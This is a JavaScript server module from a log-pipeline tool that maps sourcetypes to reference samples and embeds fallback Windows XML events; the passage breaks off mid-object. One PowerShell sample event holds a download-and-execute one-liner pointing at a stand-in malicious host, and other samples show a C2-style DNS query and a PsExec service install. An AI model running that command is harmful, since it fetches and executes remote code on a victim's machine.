import { readFileSync, existsSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { URL } from 'node:url';
import { getLookupsForSourcetype } from './lookup-bundler.mjs';
import { auditDatatypes } from './check-datatypes.mjs';
import { getAiLibrarySample, toReferenceResponse } from './ai-sample-library.mjs';
import { getVendorLibrarySample, toReferenceResponse as toVendorReferenceResponse, readVendorIndex } from './vendor-sample-library.mjs';
import { getSanitisedLibrarySampleSync, toSanitisedReferenceResponse } from './sanitised-sample-library.mjs';
import { UNREADABLE_SOURCE_SAMPLES, storeBackedAvailability } from '../src/sample-library.ts';
import { getXsiamCefSample } from '../src/xsiam-cef-samples.ts';

const __dirname = dirname(fileURLToPath(import.meta.url));
const CONFIG_DIR = join(__dirname, '..', 'config');
const CATALOG_PATH = join(CONFIG_DIR, 'reference-catalog.json');
const SAMPLE_LIB = join(CONFIG_DIR, 'sample-library');
const SOURCE_SAMPLES_PATH = join(CONFIG_DIR, 'source-samples.json');

// Curated alias map: the app's canonical sourcetypes → catalog key substrings
// (matched case-insensitively). Order matters — richest/most-relevant first.
// Extraction happened keyed by pipeline id, so a vendor's samples and fields can
// live under different keys; the resolver merges data across all matches.
//
// Loaded from config/sourcetype-aliases.json — the SINGLE SOURCE OF TRUTH shared
// with src/bundled-data.ts (iframe mode). The two used to hold hand-mirrored
// copies and DRIFTED (bundled-data was missing alibaba_action_trail and still had
// the buggy bare `audit` alias fixed here), so the same sourcetype resolved a
// different sample per run mode. Add aliases to the JSON only.
const SOURCETYPE_ALIASES = JSON.parse(
  readFileSync(join(CONFIG_DIR, 'sourcetype-aliases.json'), 'utf-8')
).aliases;

// --- Windows XML channel → channel-specific sample routing (mirrors bundled-data.ts) ---
// Windows channels share one XML ENVELOPE but NOT one event model: each channel's
// EventData carries entirely different `Data Name` attributes, so serving the same
// 4624 Security record for System/Application/DNS-Client/PowerShell/Defender is
// wrong at the SAMPLE layer. (It was wrong at the PARSER layer too — those five
// channels used to canonicalize onto windows_security and inherit its
// TargetUserName/IpAddress/LogonType aliases; they now have their own canonicals.)
// This routes both the raw channel names and those canonicals to a
// channel-appropriate reference sample.
function resolveWindowsChannel(st) {
  // Both the channel-bearing RAW forms (XmlWinEventLog:System) and the per-channel
  // CANONICALS they resolve to (windows_system) must route here — the build path
  // canonicalizes before asking for a sample. Mirrors src/bundled-data.ts.
  const canonicalChannel = /^windows_(security|system|application|defender|dns_client)$/i.test(st);
  if (!canonicalChannel && !/wineventlog|winevent/i.test(st)) return null;
  // The canonicals are XML by definition — their parser IS the XML front-end.
  const xml = canonicalChannel || /^xmlwinevent/i.test(st);
  // XML-format channels (XmlWinEventLog:*) declare per-channel XML events; the
  // shared catalog files hold Security/classic/JSON content that mismatches the
  // declared channel (validation flagged these). Route XML channels to correct
  // per-channel XML fallback samples (patterns:[] → FALLBACK_SAMPLES by key).
  if (/dns[-_]?client/i.test(st)) return xml
    ? { patterns: [], fallback: 'windows_xml_dns_client' }
    : { patterns: ['5-windows_dns', 'windows_dns'], fallback: null };
  if (/powershell/i.test(st)) return xml
    ? { patterns: [], fallback: 'windows_xml_powershell' }
    : { patterns: ['powershell', '4103'], fallback: 'windows_powershell' };
  if (/sysmon/i.test(st)) return { patterns: ['sysmon'], fallback: 'windows_sysmon' };
  if (/defender/i.test(st)) return xml
    ? { patterns: [], fallback: 'windows_xml_defender' }
    : { patterns: ['xsiam_microsoft_defender_via_eventhub', 'defender'], fallback: null };
  if (/ntlm/i.test(st)) return { patterns: [], fallback: 'windows_xml_ntlm' };
  if (/:application\b|application_wineventlog|^windows_application$/i.test(st)) return xml
    ? { patterns: [], fallback: 'windows_xml_application' }
    : { patterns: ['windows_classic_events', 'windows_classic'], fallback: null };
  // The System channel had NO XML branch: an XmlWinEventLog:System was handed the
  // classic key=value catalog sample, so the XML parser read nothing from it.
  if (/:system\b|system_wineventlog|^windows_system$/i.test(st)) return xml
    ? { patterns: [], fallback: 'windows_xml_system' }
    : { patterns: ['cribl_edge_windows_system_events', 'windows_classic_events'], fallback: null };
  // Security / generic wineventlog. The XML form (canonical windows_security or
  // XmlWinEventLog[:Security]) has an XML front-end parser (C.Text.parseWinEvent)
  // and its GOLDEN_SOURCE_EXPECTATIONS require XML attribute keys, so it MUST get
  // real Security-channel XML — the one Windows channel that used to lack its own
  // windows_xml_* sample and fell to the classic key=value catalog (which the XML
  // guard rejects → AI). Classic WinEventLog:Security keeps the key=value catalog.
  return xml
    ? { patterns: [], fallback: 'windows_xml_security' }
    : { patterns: SOURCETYPE_ALIASES.windows_security, fallback: 'windows_security' };
}

// --- *nix /var/log family → family-specific sample routing (same principle as
// resolveWindowsChannel). dnf/kern/maillog/messages/secure/dmesg all canonicalize
// to linux_syslog for the PARSER (same RFC3164/5424 syslog format), but each is a
// DIFFERENT log family with distinct content — serving one shared syslog sample
// for all of them produced 60 near-identical "CRON/PAM" entries in validation.
// A few bare names (df/ps/mi/messages) also greedily substring-matched unrelated
// catalog keys (clouDFunnel, zPSe, MItre, proofpoint messages) — the router
// short-circuits those to a correct family sample (or suppresses to AI).
// Anchored at the start (optionally after a "webN:" host-group prefix) so
// vendor-prefixed names (ivanti_linux_secure, postfix_syslog) are NOT hijacked.
// Returns null for generic syslog so the normal catalog path serves the rich
// 20-event syslog-linux sample. patterns:[] forces the FALLBACK_SAMPLES key.
function resolveLinuxFamily(st) {
  const s = st.replace(/^web\d+:/, '');
  if (/^dnf[._]librepo/.test(s)) return { patterns: [], fallback: 'linux_dnf_librepo' };
  if (/^dnf[._]rpm/.test(s)) return { patterns: [], fallback: 'linux_dnf_rpm' };
  if (/^dnf([-._]|$)/.test(s)) return { patterns: [], fallback: 'linux_dnf' };
  if (/^(kern|dmesg)([-._]|$)/.test(s)) return { patterns: [], fallback: 'linux_kernel' };
  if (/^maillog([-._]|$)/.test(s)) return { patterns: [], fallback: 'linux_maillog' };
  if (/^messages([-._]|$)/.test(s)) return { patterns: [], fallback: 'linux_messages' };
  if (/^secure(_log)?([-._]|$)/.test(s)) return { patterns: [], fallback: 'linux_secure' };
  if (/^syslog[-_]ng([-._]|$)/.test(s)) return { patterns: [], fallback: 'linux_syslogng' };
  if (/^df([-._]|$)/.test(s)) return { patterns: [], fallback: 'unix_df' };
  if (/^ps([-._]|$)/.test(s)) return { patterns: [], fallback: 'unix_ps' };
  // 'mi' has no clear family and greedily matched MITRE/SentinelOne — suppress so
  // it falls to AI generation (grounded on the recognizer) rather than wrong data.
  if (/^mi([-._]|$)/.test(s)) return { patterns: [], fallback: null };
  return null;
}

// Resolve catalog entries by explicit pattern list (Windows channel routing).
function resolveEntriesByPatterns(patterns, catalog) {
  if (!catalog) return [];
  const lc = patterns.map(p => p.toLowerCase());
  const matches = [];
  for (const [key, entry] of Object.entries(catalog.sourcetypes)) {
    const kl = key.toLowerCase();
    if (lc.some(p => kl.includes(p))) matches.push({ key, entry: withLoadableSamples(entry) });
  }
  return matches;
}

// Sourcetypes whose bundled reference samples are corrupt / format-mismatched
// (the sample's shape doesn't match any usable extraction, so it scores ~0 and
// misleads the wizard). We suppress their samples so the user uploads their own
// or uses AI-generated ones instead. Matched against the resolved canonical
// sourcetype AND the catalog key (belt + braces).
// zscaler removed from the blanket block (build 323): zscaler_web_logs is a
// valid JSON web-transaction sample; the alias now targets it precisely, so a
// broad zscaler suppression only served to starve the web pack of a sample.
const CORRUPT_SAMPLE_SOURCETYPES = new Set(['citrix_netscaler']);
const CORRUPT_SAMPLE_PATTERNS = ['citrix', 'netscaler'];
function isCorruptSampleKey(key) {
  const k = String(key || '').toLowerCase();
  return CORRUPT_SAMPLE_PATTERNS.some(p => k.includes(p));
}

function sendJson(res, data, status = 200) {
  res.statusCode = status;
  res.setHeader('Content-Type', 'application/json');
  res.end(JSON.stringify(data));
}

function getQuery(req) {
  const url = new URL(req.url || '', `http://${req.headers.host || 'localhost'}`);
  return Object.fromEntries(url.searchParams);
}

let _catalogCache = null;
function loadCatalog() {
  if (_catalogCache) return _catalogCache;
  if (!existsSync(CATALOG_PATH)) return null;
  _catalogCache = JSON.parse(readFileSync(CATALOG_PATH, 'utf-8'));
  return _catalogCache;
}

// The catalog is generated separately from the (gitignored) sample library, so
// it can contain stale sample metadata when the corresponding files were not
// generated or copied into this checkout. Only advertise samples that the
// reference-sample endpoint can actually read.
function sampleFileExists(sample) {
  return Boolean(sample?.file && existsSync(join(SAMPLE_LIB, sample.file)));
}

function withLoadableSamples(entry) {
  return { ...entry, samples: (entry.samples || []).filter(sampleFileExists) };
}

// Resolve a requested sourcetype to matching catalog entries. Uses the alias map
// first; if the sourcetype isn't a known alias, falls back to a direct-key match.
function resolveEntries(sourcetype, catalog) {
  const st = (sourcetype || '').toLowerCase().trim();
  if (!st || !catalog) return [];
  const patterns = SOURCETYPE_ALIASES[st] || [st];
  const blockSamples = CORRUPT_SAMPLE_SOURCETYPES.has(st);
  const matches = [];
  for (const [key, entry] of Object.entries(catalog.sourcetypes)) {
    const kl = key.toLowerCase();
    if (patterns.some(p => kl.includes(p))) {
      // Suppress corrupt samples: drop the entry's samples when the requested
      // sourcetype is blocked OR this specific catalog key is a known-bad source.
      if ((blockSamples || isCorruptSampleKey(key)) && (entry.samples || []).length) {
        matches.push({ key, entry: { ...entry, samples: [] } });
      } else {
        matches.push({ key, entry: withLoadableSamples(entry) });
      }
    }
  }
  // Direct exact-key fallback if aliases produced nothing.
  if (matches.length === 0 && catalog.sourcetypes[st]) {
    matches.push({ key: st, entry: withLoadableSamples(catalog.sourcetypes[st]) });
  }
  return matches;
}

// Merge multiple catalog entries into one view (union of fields, all samples,
// merged transformations + optimizations).
function mergeEntries(matches) {
  const fields = new Set();
  const samples = [];
  const transformations = {};
  const optimizations = new Set();
  let pack = null;
  for (const { entry } of matches) {
    (entry.extractionFields || []).forEach(f => fields.add(f));
    (entry.samples || []).forEach(s => samples.push(s));
    Object.assign(transformations, entry.transformations || {});
    (entry.optimizations || []).forEach(o => optimizations.add(o));
    if (!pack && entry.pack) pack = entry.pack;
  }
  // Prefer a match that actually has samples for the "pack" attribution.
  const withSamples = matches.find(m => (m.entry.samples || []).length > 0);
  if (withSamples) pack = withSamples.entry.pack;
  return {
    pack,
    fields: [...fields],
    samples,
    transformations: Object.keys(transformations),
    optimizations: [...optimizations],
  };
}

export function handleReferenceCatalog(req, res) {
  try {
    const catalog = loadCatalog();
    if (!catalog) return sendJson(res, { sourcetypes: {}, total: 0 });
    const slim = {};
    for (const [st, entry] of Object.entries(catalog.sourcetypes)) {
      const samples = (entry.samples || []).filter(sampleFileExists);
      if (samples.length > 0 || entry.extractionFields?.length > 0) {
        slim[st] = {
          pack: entry.pack,
          displayName: entry.displayName,
          hasSamples: samples.length > 0,
          sampleCount: samples.length,
          fields: entry.extractionFields?.length || 0,
          transformations: Object.keys(entry.transformations || {}),
          optimizations: entry.optimizations || [],
        };
      }
    }
    sendJson(res, { sourcetypes: slim, total: Object.keys(slim).length });
  } catch (e) {
    sendJson(res, { error: e.message }, 500);
  }
}

// Bulk availability check for the app's canonical sourcetypes. The UI calls this
// once to decide which sourcetype tiles get a "reference data" badge.
export function handleReferenceAvailability(req, res) {
  try {
    const catalog = loadCatalog();
    if (!catalog) return sendJson(res, { availability: {} });
    const availability = {};
    for (const st of Object.keys(SOURCETYPE_ALIASES)) {
      const merged = mergeEntries(resolveEntries(st, catalog));
      const sampleEvents = merged.samples.reduce((n, s) => n + (s.events || 0), 0);
      availability[st] = {
        hasSamples: merged.samples.length > 0,
        sampleEvents,
        fields: merged.fields.length,
        transformations: merged.transformations,
        optimizations: merged.optimizations,
        pack: merged.pack,
      };
    }
    // Union in sourcetypes whose only sample lives in a fallback store (vendor /
    // source / ai / sanitised). Without this the wizard offers AI-only for them
    // even though resolveFallbackSample resolves a real sample (github_*, etc.).
    const storeBacked = storeBackedAvailability({
      vendorIndex: readVendorIndex(),
      aiIndex: loadJsonIndex(join('ai-samples', 'index.json')),
      sanitisedIndex: loadJsonIndex(join('sanitised-samples', 'index.json')),
      sourceSamples: loadSourceSamples(),
    });
    for (const [st, s] of storeBacked) {
      if (availability[st]?.hasSamples) continue;
      availability[st] = {
        hasSamples: true, sampleEvents: s.sampleEvents,
        fields: 0, transformations: [], optimizations: [], pack: s.pack,
      };
    }
    sendJson(res, { availability });
  } catch (e) {
    sendJson(res, { error: e.message }, 500);
  }
}

// Static fallback samples for common sourcetypes with no catalog entry.
// These prevent batch "No sample events" failures for well-known formats.
export const FALLBACK_SAMPLES = {
  // --- Windows XML EventLog channels (see resolveWindowsChannel). Real per-channel
  // <Event> XML so each XmlWinEventLog:* channel gets its own event model instead
  // of the mislabeled Security/classic/JSON content the shared catalog files hold. ---
  windows_xml_system: [
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Service Control Manager' Guid='{555908d1-a6d7-4695-8e1e-26931d2012f4}' EventSourceName='Service Control Manager'/><EventID Qualifiers='16384'>7045</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8080000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:24:00.123456700Z'/><EventRecordID>88214</EventRecordID><Correlation/><Execution ProcessID='696' ThreadID='4056'/><Channel>System</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-21-1004336348-1177238915-682003330-1013'/></System><EventData><Data Name='ServiceName'>PSEXESVC</Data><Data Name='ImagePath'>%SystemRoot%\\PSEXESVC.exe</Data><Data Name='ServiceType'>user mode service</Data><Data Name='StartType'>demand start</Data><Data Name='AccountName'>LocalSystem</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Service Control Manager' Guid='{555908d1-a6d7-4695-8e1e-26931d2012f4}' EventSourceName='Service Control Manager'/><EventID Qualifiers='16384'>7036</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8080000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:25:12.884000000Z'/><EventRecordID>88215</EventRecordID><Correlation/><Execution ProcessID='696' ThreadID='1204'/><Channel>System</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='param1'>Windows Update</Data><Data Name='param2'>running</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Service Control Manager' Guid='{555908d1-a6d7-4695-8e1e-26931d2012f4}' EventSourceName='Service Control Manager'/><EventID Qualifiers='16384'>7040</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8080000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:26:40.005000000Z'/><EventRecordID>88216</EventRecordID><Correlation/><Execution ProcessID='696' ThreadID='4056'/><Channel>System</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='param1'>Background Intelligent Transfer Service</Data><Data Name='param2'>demand start</Data><Data Name='param3'>auto start</Data><Data Name='param4'>BITS</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='User32' Guid='{b0aa8734-56f7-41cc-b2f4-de228e98b946}' EventSourceName='User32'/><EventID Qualifiers='32768'>1074</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8080000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:27:02.220000000Z'/><EventRecordID>88217</EventRecordID><Correlation/><Execution ProcessID='1160' ThreadID='5528'/><Channel>System</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-21-1004336348-1177238915-682003330-1013'/></System><EventData><Data>C:\\Windows\\system32\\RuntimeBroker.exe (WKS-1042)</Data><Data>WKS-1042</Data><Data>No title for this reason could be found</Data><Data>0x500ff</Data><Data>power off</Data><Data></Data><Data>ACME\\jdoe</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Kernel-Power' Guid='{331c3b3a-2005-44c2-ac5e-77220c37d6b4}'/><EventID>41</EventID><Version>0</Version><Level>1</Level><Task>63</Task><Opcode>0</Opcode><Keywords>0x8000000000000002</Keywords><TimeCreated SystemTime='2024-05-06T17:28:15.771000000Z'/><EventRecordID>88218</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='8'/><Channel>System</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='BugcheckCode'>0</Data><Data Name='BugcheckParameter1'>0x0</Data><Data Name='SleepInProgress'>0</Data><Data Name='PowerButtonTimestamp'>0</Data><Data Name='BootAppStatus'>0</Data></EventData></Event>`,
  ],
  windows_xml_application: [
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Application Error'/><EventID Qualifiers='0'>1000</EventID><Level>2</Level><Task>100</Task><Keywords>0x80000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:24:00.123456700Z'/><EventRecordID>44012</EventRecordID><Channel>Application</Channel><Computer>WKS-1042.acme.local</Computer><Security/></System><EventData><Data>outlook.exe</Data><Data>16.0.17328.20124</Data><Data>KERNELBASE.dll</Data><Data>10.0.19041.4239</Data><Data>c0000005</Data><Data>0000000000034f29</Data><Data>2f18</Data><Data>01da9f8c3a1b2c3d</Data><Data>C:\\Program Files\\Microsoft Office\\root\\Office16\\outlook.exe</Data><Data>C:\\Windows\\System32\\KERNELBASE.dll</Data><Data>a1b2c3d4-e5f6-7890-abcd-ef1234567890</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='MsiInstaller'/><EventID Qualifiers='0'>11707</EventID><Level>4</Level><Task>0</Task><Keywords>0x80000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:25:12.884000000Z'/><EventRecordID>44013</EventRecordID><Channel>Application</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-21-1004336348-1177238915-682003330-1013'/></System><EventData><Data>Product: 7-Zip 23.01 (x64) -- Installation completed successfully.</Data><Data>(NULL)</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='.NET Runtime'/><EventID Qualifiers='0'>1026</EventID><Level>2</Level><Task>0</Task><Keywords>0x80000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:26:40.005000000Z'/><EventRecordID>44014</EventRecordID><Channel>Application</Channel><Computer>WKS-1042.acme.local</Computer><Security/></System><EventData><Data>Application: PayrollApp.exe\nFramework Version: v4.0.30319\nDescription: The process was terminated due to an unhandled exception.\nException Info: System.NullReferenceException</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='ESENT'/><EventID Qualifiers='0'>326</EventID><Level>4</Level><Task>1</Task><Keywords>0x80000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:27:02.220000000Z'/><EventRecordID>44015</EventRecordID><Channel>Application</Channel><Computer>WKS-1042.acme.local</Computer><Security/></System><EventData><Data>svchost (1234)</Data><Data>The database engine attached a database (1, C:\\Windows\\system32\\CatRoot2\\catdb).</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Windows Error Reporting'/><EventID Qualifiers='0'>1001</EventID><Level>4</Level><Task>0</Task><Keywords>0x80000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:28:15.771000000Z'/><EventRecordID>44016</EventRecordID><Channel>Application</Channel><Computer>WKS-1042.acme.local</Computer><Security/></System><EventData><Data>Fault bucket 123456789, type 5\nEvent Name: APPCRASH\nResponse: Not available\nFaulting application name: outlook.exe</Data></EventData></Event>`,
  ],
  windows_xml_dns_client: [
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-DNS-Client' Guid='{1c95126e-7eea-49a9-a3fe-a378b03ddb4d}'/><EventID>3006</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:24:00.123456700Z'/><EventRecordID>1201</EventRecordID><Correlation/><Execution ProcessID='2412' ThreadID='3120'/><Channel>Microsoft-Windows-DNS-Client/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-21-1004336348-1177238915-682003330-1013'/></System><EventData><Data Name='QueryName'>www.microsoft.com</Data><Data Name='QueryType'>1</Data><Data Name='QueryOptions'>140737488355328</Data><Data Name='ServerList'>10.0.1.1;</Data><Data Name='IsNetworkQuery'>1</Data><Data Name='NetworkQueryIndex'>0</Data><Data Name='InterfaceIndex'>0</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-DNS-Client' Guid='{1c95126e-7eea-49a9-a3fe-a378b03ddb4d}'/><EventID>3008</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:24:00.155000000Z'/><EventRecordID>1202</EventRecordID><Correlation/><Execution ProcessID='2412' ThreadID='3120'/><Channel>Microsoft-Windows-DNS-Client/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-21-1004336348-1177238915-682003330-1013'/></System><EventData><Data Name='QueryName'>www.microsoft.com</Data><Data Name='QueryType'>1</Data><Data Name='QueryOptions'>140737488355328</Data><Data Name='QueryStatus'>0</Data><Data Name='QueryResults'>23.55.72.14;23.55.72.20;</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-DNS-Client' Guid='{1c95126e-7eea-49a9-a3fe-a378b03ddb4d}'/><EventID>3008</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:25:12.884000000Z'/><EventRecordID>1203</EventRecordID><Correlation/><Execution ProcessID='4088' ThreadID='2044'/><Channel>Microsoft-Windows-DNS-Client/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='QueryName'>malware-c2.example.net</Data><Data Name='QueryType'>28</Data><Data Name='QueryOptions'>140737488355328</Data><Data Name='QueryStatus'>9003</Data><Data Name='QueryResults'></Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-DNS-Client' Guid='{1c95126e-7eea-49a9-a3fe-a378b03ddb4d}'/><EventID>3006</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:26:40.005000000Z'/><EventRecordID>1204</EventRecordID><Correlation/><Execution ProcessID='6120' ThreadID='7020'/><Channel>Microsoft-Windows-DNS-Client/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-21-1004336348-1177238915-682003330-1013'/></System><EventData><Data Name='QueryName'>ctldl.windowsupdate.com</Data><Data Name='QueryType'>1</Data><Data Name='QueryOptions'>140737488355328</Data><Data Name='ServerList'>10.0.1.1;</Data><Data Name='IsNetworkQuery'>1</Data><Data Name='NetworkQueryIndex'>0</Data><Data Name='InterfaceIndex'>0</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-DNS-Client' Guid='{1c95126e-7eea-49a9-a3fe-a378b03ddb4d}'/><EventID>3008</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:28:15.771000000Z'/><EventRecordID>1205</EventRecordID><Correlation/><Execution ProcessID='6120' ThreadID='7020'/><Channel>Microsoft-Windows-DNS-Client/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-21-1004336348-1177238915-682003330-1013'/></System><EventData><Data Name='QueryName'>ctldl.windowsupdate.com</Data><Data Name='QueryType'>1</Data><Data Name='QueryOptions'>140737488355328</Data><Data Name='QueryStatus'>0</Data><Data Name='QueryResults'>::ffff:8.241.11.126;</Data></EventData></Event>`,
  ],
  windows_xml_powershell: [
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4104</EventID><Version>1</Version><Level>3</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2024-05-06T17:24:00.123456700Z'/><EventRecordID>9021</EventRecordID><Correlation ActivityID='{b1c2d3e4-f5a6-7890-bcde-f01234567890}'/><Execution ProcessID='6412' ThreadID='7120'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-21-1004336348-1177238915-682003330-1013'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>IEX (New-Object Net.WebClient).DownloadString('http://malicious.example.com/payload.ps1')</Data><Data Name='ScriptBlockId'>{c3d4e5f6-a7b8-9012-cdef-012345678901}</Data><Data Name='Path'></Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4103</EventID><Version>1</Version><Level>4</Level><Task>106</Task><Opcode>20</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2024-05-06T17:25:12.884000000Z'/><EventRecordID>9022</EventRecordID><Correlation ActivityID='{b1c2d3e4-f5a6-7890-bcde-f01234567890}'/><Execution ProcessID='6412' ThreadID='7120'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-21-1004336348-1177238915-682003330-1013'/></System><EventData><Data Name='ContextInfo'>Severity = Informational\nHost Name = ConsoleHost\nUser = ACME\\jdoe\nCommand Name = Invoke-WebRequest</Data><Data Name='Payload'>CommandInvocation(Invoke-WebRequest): "Invoke-WebRequest"</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2024-05-06T17:26:40.005000000Z'/><EventRecordID>9023</EventRecordID><Correlation ActivityID='{d4e5f6a7-b8c9-0123-defa-123456789012}'/><Execution ProcessID='7220' ThreadID='4412'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Get-Process | Where-Object { $_.CPU -gt 100 } | Sort-Object CPU -Descending</Data><Data Name='ScriptBlockId'>{e5f6a7b8-c9d0-1234-efab-234567890123}</Data><Data Name='Path'>C:\\Scripts\\monitor.ps1</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4105</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>17</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2024-05-06T17:27:02.220000000Z'/><EventRecordID>9024</EventRecordID><Correlation ActivityID='{d4e5f6a7-b8c9-0123-defa-123456789012}'/><Execution ProcessID='7220' ThreadID='4412'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='ScriptBlockId'>{e5f6a7b8-c9d0-1234-efab-234567890123}</Data><Data Name='RunspaceId'>{f6a7b8c9-d0e1-2345-fabc-345678901234}</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4103</EventID><Version>1</Version><Level>4</Level><Task>106</Task><Opcode>20</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2024-05-06T17:28:15.771000000Z'/><EventRecordID>9025</EventRecordID><Correlation ActivityID='{a7b8c9d0-e1f2-3456-abcd-456789012345}'/><Execution ProcessID='3320' ThreadID='2244'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-21-1004336348-1177238915-682003330-1013'/></System><EventData><Data Name='ContextInfo'>Severity = Informational\nHost Name = Windows PowerShell ISE Host\nUser = ACME\\jdoe\nCommand Name = Get-ChildItem</Data><Data Name='Payload'>CommandInvocation(Get-ChildItem): "Get-ChildItem"</Data></EventData></Event>`,
  ],
  windows_xml_ntlm: [
